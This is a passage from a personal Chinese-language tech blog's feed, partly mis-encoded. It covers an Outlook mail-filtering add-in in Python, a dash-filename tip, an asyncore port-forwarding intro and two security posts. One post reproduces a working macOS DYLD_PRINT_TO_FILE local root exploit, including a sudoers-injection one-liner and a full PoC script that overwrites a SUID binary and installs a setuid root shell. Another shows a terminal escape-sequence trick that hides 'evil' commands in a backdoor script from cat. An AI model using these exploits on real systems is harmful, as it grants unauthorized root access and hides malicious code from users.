class="string">&quot;Standard&quot;</span>)</span><br><span class="line">            item = toolbar.Controls.Add(Type=constants.msoControlButton, Temporary=<span class="literal">True</span>)</span><br><span class="line">            <span class="comment"># Hook events for the item</span></span><br><span class="line">            item = self.toolbarButton = DispatchWithEvents(item, ButtonEvent)</span><br><span class="line">            item.Caption=<span class="string">&quot;LogFilter&quot;</span></span><br><span class="line">            item.TooltipText = <span class="string">&quot;About&quot;</span></span><br><span class="line">            item.Enabled = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;registered&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># get folder objs</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Accessing folders&#x27;</span></span><br><span class="line">        inbox        = application.Session.GetDefaultFolder(constants.olFolderInbox)</span><br><span class="line">        deleted      = application.Session.GetDefaultFolder(constants.olFolderDeletedItems)</span><br><span class="line">        log_bot = inbox.Folders[BotFolder]</span><br><span class="line">        log_usr = inbox.Folders[TargetFolder]</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Accessed&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># filter bot folder in each start</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Filtering exists&#x27;</span></span><br><span class="line">        filterList=[]</span><br><span class="line">        <span class="keyword">for</span> iLog <span class="keyword">in</span> log_bot.Items:</span><br><span class="line">            filterList.append(iLog)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> filterList:</span><br><span class="line">            handleItem(i)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Filtered&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># mesure Deleted after last filter</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Cleaning Deleted&#x27;</span></span><br><span class="line">        dellist=[]</span><br><span class="line">        <span class="keyword">for</span> iToDel <span class="keyword">in</span> deleted.Items:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(iToDel.SenderName.encode(<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">in</span> Log_Sender):</span><br><span class="line">                    dellist.append(iToDel)</span><br><span class="line">            <span class="keyword">except</span> AttributeError,e:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Error removing&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;from Deleted&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dellist:</span><br><span class="line">            i.Delete()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Cleaned&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># hook up</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Hooking folders&#x27;</span></span><br><span class="line">        self.deletedItems = DispatchWithEvents(deleted.Items, DeletedEvent)</span><br><span class="line">        self.LogFilter = DispatchWithEvents(log_bot.Items, FolderEvent)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Hooked&#x27;</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnDisconnection</span>(<span class="params">self, mode, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnDisconnection&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnAddInsUpdate</span>(<span class="params">self, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnAddInsUpdate&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnStartupComplete</span>(<span class="params">self, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnStartupComplete&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnBeginShutdown</span>(<span class="params">self, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnBeginShutdown&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RegisterAddin</span>(<span class="params">klass</span>):</span></span><br><span class="line">    <span class="keyword">import</span> _winreg</span><br><span class="line">    key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Office\\Outlook\\Addins&quot;</span>)</span><br><span class="line">    subkey = _winreg.CreateKey(key, klass._reg_progid_)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;CommandLineSafe&quot;</span>, <span class="number">0</span>, _winreg.REG_DWORD, <span class="number">0</span>)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;LoadBehavior&quot;</span>, <span class="number">0</span>, _winreg.REG_DWORD, <span class="number">3</span>)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;Description&quot;</span>, <span class="number">0</span>, _winreg.REG_SZ, klass._reg_progid_)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;FriendlyName&quot;</span>, <span class="number">0</span>, _winreg.REG_SZ, klass._reg_progid_)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UnregisterAddin</span>(<span class="params">klass</span>):</span></span><br><span class="line">    <span class="keyword">import</span> _winreg</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _winreg.DeleteKey(_winreg.HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Office\\Outlook\\Addins\\&quot;</span> + klass._reg_progid_)</span><br><span class="line">    <span class="keyword">except</span> WindowsError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> win32com.server.register</span><br><span class="line">    win32com.server.register.UseCommandLine(OutlookAddin)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;--unregister&quot;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        UnregisterAddin(OutlookAddin)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        RegisterAddin(OutlookAddin)</span><br></pre></td></tr></table></figure>
<p>å¦ï¼Œoutlookspyå¯¹æŸ¥çœ‹comå¯¹è±¡å¾ˆæœ‰å¸®åŠ©ã€‚</p>
<p>è®¸ä¹…ä¸ç”¨mdç”Ÿç–äº†   O_o</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>å¯¹ä»˜ä»¥å‡å·å¼€å¤´çš„æ–‡ä»¶</title>
    <url>/2015/07/22/2015-07-22/</url>
    <content><![CDATA[<p>linuxä¸‹ä¸å°å¿ƒæŠŠæ–‡ä»¶å¼„æˆ  -sth  çš„æ–‡ä»¶åäº†ã€‚ã€‚ã€‚<br>ä¸Šç½‘æŸ¥äº†æŸ¥å‘ç°ä¸¤ç§ç®€å•çš„æ–¹æ³•ï¼š<br>eg:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mv  --  -sth  sth</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…æœºæ™ºçš„ç”¨</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mv  ./-sth  sth</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac OSX yosemiteæœ¬åœ°ææƒæ¼æ´</title>
    <url>/2015/08/07/2015-08-07/</url>
    <content><![CDATA[<p>æ˜¨æ™šåœ¨<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzc0MTgwLmh0bWw=" title="http://www.freebuf.com/news/74180.html">freebuf<i class="fa fa-external-link"></i></span>ä¸Šçœ‹åˆ°ä¸€ç¯‡macä¸‹æ¶æ„è½¯ä»¶çš„åˆ†ææ–‡ç« ï¼Œè½¯ä»¶åˆ©ç”¨å‰æ®µæ—¶é—´æœ‰æŠ¥é“è¿‡çš„<strong>DYLD_PRINT_TO_FILE</strong>ç¯å¢ƒå˜é‡æ¥å®ç°æœ¬åœ°ææƒå…å¯†ç rootå®‰è£…ã€‚<br>è„šæœ¬æ€è·¯å¤§è‡´å¦‚ä¸‹ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;echo \&quot;<span class="subst">$(whoami)</span> ALL=(ALL) NOPASSWD:ALL\&quot; &gt;&amp;3 &quot;</span>|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo -s dosomethingroot</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuYXBwbGUuY29tL2xpYnJhcnkvcHJlcmVsZWFzZS9tYWMvZG9jdW1lbnRhdGlvbi9EYXJ3aW4vUmVmZXJlbmNlL01hblBhZ2VzL21hbjEvZHlsZC4xLmh0bWw=" title="https://developer.apple.com/library/prerelease/mac/documentation/Darwin/Reference/ManPages/man1/dyld.1.html">DYLD<i class="fa fa-external-link"></i></span>å…¨ç§°dynamic link editorï¼Œå¬åå­—æ˜¯å®ç°ç±»ä¼¼åŠ¨æ€é“¾æ¥åº“åŠ è½½çš„ä¸œè¥¿ï¼Œ<strong>DYLD_PRINT_TO_FILE</strong>æ˜¯è‹¹æœåœ¨OSX 10.10åŠ å…¥çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å®ç°å°†dyldè¿›ç¨‹çš„é”™è¯¯æ—¥å¿—é‡å®šå‘åˆ°æ­¤ç¯å¢ƒå˜é‡æŒ‡å®šçš„å¯å†™æ–‡ä»¶ã€‚ä¸è¿‡æ·»åŠ è¿™ä¸ªç‰¹æ€§çš„æ—¶å€™è²Œä¼¼æ²¡æŠŠå®ƒåŠ åœ¨æœ‰å®‰å…¨éªŒè¯çš„ä»£ç èŒƒå›´å†…è€Œæ˜¯ç›´æ¥å†™åœ¨dyldçš„mainé‡Œäº†ã€‚ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¤§è‡´æ·»åŠ çš„ä»£ç </span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* loggingPath = _simple_getenv(envp, <span class="string">&quot;DYLD_PRINT_TO_FILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( loggingPath != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, <span class="number">0644</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd != <span class="number">-1</span> ) &#123;</span><br><span class="line">                sLogfile = fd;</span><br><span class="line">                sLogToFile = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                dyld::<span class="built_in">log</span>(<span class="string">&quot;dyld: could not open DYLD_PRINT_TO_FILE=&#x27;%s&#x27;, errno=%d\n&quot;</span>, loggingPath, errno);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»ä»£ç ä¸­æ¥çœ‹dyldæ˜¯ç›´æ¥ä»ç¯å¢ƒå˜é‡ä¸­è·å–<strong>DYLD_PRINT_TO_FILE</strong>çš„å€¼ä½œä¸ºæ–‡ä»¶è·¯å¾„å¹¶appendå†™æ‰“å¼€æ–‡ä»¶ï¼Œé‚£ä¹ˆé—®é¢˜å°±æ¥äº†ã€‚ã€‚ã€‚<br>æ™®é€šç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™ä¸ªå˜é‡åœ¨ç³»ç»Ÿç›®å½•åˆ›å»ºæ–‡ä»¶ï¼Œæˆ–å¦‚å‰é¢çš„æ¶æ„è½¯ä»¶é‚£æ ·ä¿®æ”¹rootçš„é…ç½®æ–‡ä»¶ï¼Œæˆ–ä¿®æ”¹SUIDçš„binæ–‡ä»¶ã€‚<br>æ›´ä¸¥é‡çš„æ˜¯è¿™ä¸ªæ–‡ä»¶çš„æè¿°ç¬¦å¹¶æ²¡æœ‰è¢«å…³é—­ï¼Œç‰¹æƒçˆ¶è¿›ç¨‹forkå‡ºçš„å­è¿›ç¨‹éƒ½å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œã€‚<br>äº†è§£äº†åŸç†å†çœ‹æ¶æ„è½¯ä»¶çš„ä»£ç ï¼Œè„šæœ¬é¦–å…ˆè®¾ç½®ç¯å¢ƒå˜é‡DYLD_PRINT_TO_FILEï¼Œå†å¯åŠ¨newgrpè¿™ä¸ªSUIDæ–‡ä»¶æ¥æ‰§è¡Œecho â€œstringâ€ &gt; &amp;3çš„æ“ä½œï¼Œæ­¤æ—¶3é€šè¿‡<strong>DYLD_PRINT_TO_FILE</strong>åˆ†é…ç»™äº†sudoersæ–‡ä»¶ï¼Œæ‰€ä»¥ç»“æœå°±æ˜¯åœ¨sudoersçš„å°¾éƒ¨æ·»åŠ äº†ä¸€è¡Œé’ˆå¯¹å½“å‰è´¦æˆ·çš„é…ç½®ï¼Œè„šæœ¬å†å»æ‰§è¡Œsudo -s commandå°±æ²¡æœ‰æç¤ºäº†ã€‚<br>googleäº†ä¸€ç•ªçœ‹äº†äº›æ­ªæœä»å†™çš„å¸–å­ï¼Œä»¥ä¸‹ä¸ºä¸¤ä¸ªå…³äºæ­¤æ¼æ´çš„pocè„šæœ¬</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$  EDITOR=/usr/bin/<span class="literal">true</span> DYLD_PRINT_TO_FILE=/this_system_is_vulnerable crontab -e</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªpocç”¨çš„æ˜¯suidçš„crontabä½œloader</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç²¾å½©çš„poc</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Simple Proof of Concept Exploit for the DYLD_PRINT_TO_FILE</span></span><br><span class="line"><span class="comment"># local privilege escalation vulnerability in OS X 10.10 - 10.10.4</span></span><br><span class="line"><span class="comment"># (C) Copyright 2015 Stefan Esser &lt;stefan.esser@sektioneins.de&gt;</span></span><br><span class="line"><span class="comment"># Wait months for a fix from Apple or install the following KEXT as protection</span></span><br><span class="line"><span class="comment"># https://github.com/sektioneins/SUIDGuard</span></span><br><span class="line"><span class="comment"># Use at your own risk. This copies files around with root permissions,</span></span><br><span class="line"><span class="comment"># overwrites them and deletes them afterwards. Any glitch could corrupt your</span></span><br><span class="line"><span class="comment"># system. So you have been warned.</span></span><br><span class="line">SUIDVICTIM=/usr/bin/newgrp</span><br><span class="line"><span class="comment"># why even try to prevent a race condition?</span></span><br><span class="line">TARGET=`<span class="built_in">pwd</span>`/tmpXXXXX</span><br><span class="line">rm -rf <span class="variable">$TARGET</span></span><br><span class="line">mkdir <span class="variable">$TARGET</span></span><br><span class="line"></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; $TARGET/boomsh.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">        setuid(0);</span></span><br><span class="line"><span class="string">        setgid(0);</span></span><br><span class="line"><span class="string">        system(&quot;/bin/bash -i&quot;);</span></span><br><span class="line"><span class="string">        printf(&quot;done.\n&quot;);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(int argc, char **argv)&#123;</span></span><br><span class="line"><span class="string">        int fd;</span></span><br><span class="line"><span class="string">        char buffer[1024];</span></span><br><span class="line"><span class="string">        ssize_t toread, numread;</span></span><br><span class="line"><span class="string">        ssize_t numwritten;</span></span><br><span class="line"><span class="string">        ssize_t size;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* disable O_APPEND */</span></span><br><span class="line"><span class="string">        fcntl(3, F_SETFL, 0);</span></span><br><span class="line"><span class="string">        lseek(3, 0, SEEK_SET);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* write file into it */</span></span><br><span class="line"><span class="string">        fd = open(</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\&quot;<span class="variable">$TARGET</span>/boomsh\&quot;&quot;</span> &gt;&gt; <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt;&gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">        , O_RDONLY, 0);</span></span><br><span class="line"><span class="string">        if (fd &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                /* determine size */</span></span><br><span class="line"><span class="string">                size = lseek(fd, 0, SEEK_END);</span></span><br><span class="line"><span class="string">                lseek(fd, 0, SEEK_SET);</span></span><br><span class="line"><span class="string">                while (size &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                        if (size &gt; sizeof(buffer)) &#123;</span></span><br><span class="line"><span class="string">                                toread = sizeof(buffer);</span></span><br><span class="line"><span class="string">                        &#125; else &#123;</span></span><br><span class="line"><span class="string">                                toread = size;</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numread = read(fd, &amp;buffer, toread);</span></span><br><span class="line"><span class="string">                        if (numread &lt; toread) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem reading\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numwritten = write(3, &amp;buffer, numread);</span></span><br><span class="line"><span class="string">                        if (numread != numwritten) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem writing\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        size -= numwritten;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                fsync(3);</span></span><br><span class="line"><span class="string">                close(fd);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, &quot;Cannot open for reading\n&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">cp <span class="variable">$SUIDVICTIM</span> <span class="variable">$TARGET</span>/backup</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/overwrite <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/boomsh <span class="variable">$TARGET</span>/boomsh.c</span><br><span class="line">EDITOR=<span class="variable">$TARGET</span>/overwrite DYLD_PRINT_TO_FILE=<span class="variable">$SUIDVICTIM</span> crontab -e 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/boomsh /usr/bin/boomsh; chmod 04755 /usr/bin/boomsh &quot;</span> | <span class="variable">$SUIDVICTIM</span> &gt; /dev/null 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/backup <span class="variable">$SUIDVICTIM</span>&quot;</span> | /usr/bin/boomsh &gt; /dev/null 2&gt; /dev/null</span><br><span class="line">rm -rf <span class="variable">$TARGET</span></span><br><span class="line">/usr/bin/boomsh</span><br></pre></td></tr></table></figure>

<p>è¿™é£éªšçš„bashå§¿åŠ¿ä¹Ÿæ˜¯è®©äººå¤§å¼€çœ¼ç•Œï¼Œæ­ªæœä»çœŸä¼šç©ã€‚<br>è„šæœ¬ç”Ÿæˆäº†ä¸¤ä¸ªcï¼Œç¬¬ä¸€ä¸ªæ¯”è¾ƒç®€å•ï¼Œå…ˆè®¾ç½®ç”¨æˆ·å’Œç»„åˆ°rootï¼Œå†è°ƒç”¨bashï¼›ç¬¬äºŒä¸ªæŠŠç¬¬ä¸€ä¸ªç”Ÿæˆçš„äºŒè¿›åˆ¶è¯»å‡ºæ¥å†å†™åˆ°æ–‡ä»¶æµ3(DYLD_PRINT_TO_FILE)é‡Œã€‚<br>ä¹‹åè„šæœ¬æŠŠnewgrp(host suid)æ‹·åˆ°ä¸´æ—¶æ–‡ä»¶ï¼Œç¼–è¯‘ä¸¤ä¸ªcï¼Œé€šè¿‡crontab(loader suid)è·å¾—é«˜æƒé™çš„3æ–‡ä»¶æè¿°ç¬¦(å†™åˆ°host suid)ï¼Œcrontabè°ƒç”¨EDITORæŠŠboomshå†™åˆ°3(ä¸è¦æ±‚ç‰¹æƒ)ï¼Œç„¶åè°ƒç”¨è¢«ä¿®æ”¹äº†çš„newgrp(host suid)å®‰è£…boomshå¹¶è®¾ç½®boomshçš„suidï¼Œå†è°ƒç”¨å®‰è£…å¥½çš„boomshè¿˜åŸnewgrpï¼Œåˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œæ‰§è¡Œboomshã€‚</p>
<p>è¿™é‡Œéœ€è¦æä¸€ç‚¹ï¼Œè™½ç„¶writeçš„manualä¸­è¯´éç‰¹æƒè´¦æˆ·writeå¸¦suidçš„binæ—¶ä¼šå»é™¤binçš„suidï¼Œä½†å¾—ç›ŠäºDYLD_PRINT_TO_FILEï¼Œloader suidè¿›ç¨‹ä»¥rootæ‰“å¼€äº†å¸¦suidçš„host binï¼Œæ–‡ä»¶æè¿°ç¬¦ç»§æ‰¿äº†rootçº§åˆ«çš„ç‰¹æƒï¼Œæ‰€ä»¥å¯¹æè¿°ç¬¦çš„æ“ä½œä¼šè¢«è®¤ä¸ºæ˜¯rootçº§çš„ï¼Œæ‰€ä»¥æ²¡æœ‰è§¦å‘manualä¸­è¯´çš„å¯¹writeçš„é™åˆ¶ï¼Œå…·ä½“çš„ç»†èŠ‚åº”è¯¥ç±»ä¼¼äºwinä¸‹æ–‡ä»¶çš„contextä¹‹ç±»çš„å§ã€‚</p>
<p>å¼€å‘äººå‘˜çš„å®‰å…¨æ„è¯†æœ‰å¾…æé«˜å•Šã€‚</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VrdGlvbmVpbnMuZGUvZW4vYmxvZy8xNS0wNy0wNy1keWxkX3ByaW50X3RvX2ZpbGVfbHBlLmh0bWw=" title="https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html">å‚è€ƒé“¾æ¥<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>A shell trick</title>
    <url>/2015/09/30/2015-09-30/</url>
    <content><![CDATA[<p>ç ç˜Ÿç»™æˆ‘å‘äº†ä¸ªå¥½ç©çš„ä¸œè¥¿</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf &#x27;#!/bin/bash\necho doing something evil!\nexit\n\033[2Aecho doing something very nice!\n&#x27; &gt;backdoor.sh</span><br><span class="line">chmod +x backdoor.sh</span><br><span class="line">cat backdoor.sh</span><br><span class="line">./backdoor.sh</span><br></pre></td></tr></table></figure>
<p>man ascii æŸ¥äº†ä¸‹\033æ˜¯ESCï¼Œç†è®ºä¸Šé€šè¿‡è¿™ç§æ§åˆ¶ç¬¦èƒ½ç©å‡ºå¾ˆå¤šèŠ±æ ·ã€‚<br><span class="exturl" data-url="aHR0cHM6Ly96b3JrLm5ldC9+c3Qvam90dGluZ3MvTm90ZXNfb25fVGVybWluYWxfRW11bGF0aW9uLmh0bWw=" title="https://zork.net/~st/jottings/Notes_on_Terminal_Emulation.html">ç›¸å…³é“¾æ¥<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>python asyncoreå®ç°ç«¯å£è½¬å‘</title>
    <url>/2015/10/01/2015-10-01/</url>
    <content><![CDATA[<p>æœ€è¿‘Digital Oceançš„VPSç›´è¿ä¸€ç›´è¿ä¸ä¸Šï¼Œæ€€ç–‘æ˜¯åŠŸå¤«ç‹æ ¹æ®sshçš„æµé‡ç‰¹å¾åšäº†æ‹¦æˆªï¼Œé‚å†™äº†ä¸ªè„šæœ¬å®ç°RC4åŠ å¯†çš„ç«¯å£è½¬å‘(ä¸»è¦ç›®çš„æ˜¯è§„é¿æµé‡ç‰¹å¾çš„åˆ†æ)ã€‚<br>pythonçš„asyncoreåº“æ˜¯ä¸€ä¸ªå¼‚æ­¥çš„socketé€šä¿¡åº“ã€‚<br>ä¸€ä¸ªç®€å•çš„ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncore, socket</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPClient</span>(<span class="params">asyncore.dispatcher</span>):</span>              <span class="comment"># ç»§æ‰¿dispatcherç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, path</span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self)</span><br><span class="line">                                                    <span class="comment"># è¿™ä¸ªç¤ºä¾‹æ˜¯clientç«¯</span></span><br><span class="line">        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.connect( (host, <span class="number">80</span>) )</span><br><span class="line">        self.buffer = <span class="string">&#x27;GET %s HTTP/1.0\r\n\r\n&#x27;</span> % path</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_connect</span>(<span class="params">self</span>):</span>                       <span class="comment"># æ­¤æˆå‘˜åœ¨è¿æ¥æˆåŠŸæ—¶è¢«è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_close</span>(<span class="params">self</span>):</span>                         <span class="comment"># è¿œç¨‹å…³é—­æ—¶è¢«è°ƒç”¨</span></span><br><span class="line">        self.close()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_read</span>(<span class="params">self</span>):</span>                          <span class="comment"># é»˜è®¤æƒ…å†µä¸‹loopä¼šå¾ªç¯è°ƒç”¨æ­¤å‡½æ•°ï¼Œå¯è‡ªå®šä¹‰readableæˆå‘˜å®ç°æ¡ä»¶æ§åˆ¶</span></span><br><span class="line">        <span class="built_in">print</span> self.recv(<span class="number">8192</span>)                       <span class="comment"># åº”è¯¥ä¼šé˜»å¡åœ¨è¿™</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writable</span>(<span class="params">self</span>):</span>                             <span class="comment"># å¯å‘é€çš„æ¡ä»¶æ§åˆ¶æˆå‘˜</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">len</span>(self.buffer) &gt; <span class="number">0</span>)               <span class="comment"># å½“å‘é€é˜Ÿåˆ—ä¸ä¸ºç©ºæ—¶</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_write</span>(<span class="params">self</span>):</span>                         <span class="comment"># å‘é€æ“ä½œè°ƒç”¨çš„å›è°ƒ</span></span><br><span class="line">        sent = self.send(self.buffer)</span><br><span class="line">        self.buffer = self.buffer[sent:]</span><br><span class="line">client = HTTPClient(<span class="string">&#x27;www.python.org&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">asyncore.loop()                                     <span class="comment"># æ­¤è°ƒç”¨ä¼šåœ¨asyncoreå†…éƒ¨å¼€å§‹å¼‚æ­¥é€šä¿¡</span></span><br></pre></td></tr></table></figure>
<p>dispatcherçˆ¶ç±»ä¸­handleå¼€å¤´çš„æˆå‘˜éƒ½æ˜¯å›è°ƒç±»ï¼Œå¯åœ¨å­ç±»ä¸­å®šä¹‰å›è°ƒå‡½æ•°ã€‚</p>
<p>åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€äº›ç±»ä¼¼çš„ç¨‹åºéƒ½æ„Ÿè§‰ä»£ç å†™çš„ä¸æ˜¯å¾ˆå¥½ï¼Œäºæ˜¯è‡ªå·±æŸ¥äº†ä¸‹manualé‡æ–°é€ äº†éè½®å­ï¼Œå‘ç°è¿˜æ˜¯æŒºåˆ«æ‰­ğŸ˜‚<br>å¤§è‡´ä»£ç å¦‚ä¸‹ï¼š</p>
